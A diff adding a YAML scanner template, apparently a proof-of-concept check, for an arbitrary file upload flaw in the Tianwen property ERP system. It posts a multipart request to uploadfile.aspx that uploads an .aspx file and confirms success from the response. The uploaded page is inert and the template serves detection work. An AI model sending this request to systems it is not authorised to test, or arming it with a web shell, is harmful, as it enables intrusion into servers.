@@ -1,0 +1,42 @@
+name: 天问物业ERP系统 uploadfile.aspx 任意文件上传漏洞
+rules:
+  r0:
+    request:
+      method: POST
+      path: /HM/M_Main/uploadfile.aspx
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytKnDdPq6SMXufwyT
+      body: |
+          
+          
+          ------WebKitFormBoundarytKnDdPq6SMXufwyT
+          Content-Disposition: form-data; name="__VIEWSTATE"
+          
+          
+          /wEPDwUKLTg1NDU3MTA4OQ9kFgICAQ8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk70CKfgUcso35StfmoNB/ObwwU8W4qvmgqa52HxmqsU0=
+          ------WebKitFormBoundarytKnDdPq6SMXufwyT
+          Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+          
+          
+          DE1005D5
+          ------WebKitFormBoundarytKnDdPq6SMXufwyT
+          Content-Disposition: form-data; name="__EVENTVALIDATION"
+          
+          
+          /wEdAAIk02sIXo/TRIPUygBB64GvmW/ynBkkkA2xI95ik8Vs4GXPPWvIYnA84468jdc5Wr+nrufsSY+RKtcm7vKIotDs
+          ------WebKitFormBoundarytKnDdPq6SMXufwyT
+          Content-Disposition: form-data; name="BtnSave"
+          
+          
+          确定上传
+          ------WebKitFormBoundarytKnDdPq6SMXufwyT
+          Content-Disposition: form-data; name="upload_img"; filename="1.aspx"
+          Content-Type: application/octet-stream
+          
+          
+          <%@Page Language="C#"%>
+          
+          
+          ------WebKitFormBoundarytKnDdPq6SMXufwyT
+    expression: response.body.bcontains(b'/HM/M_Main/OAUpLoadFile/')
+expression: r0()
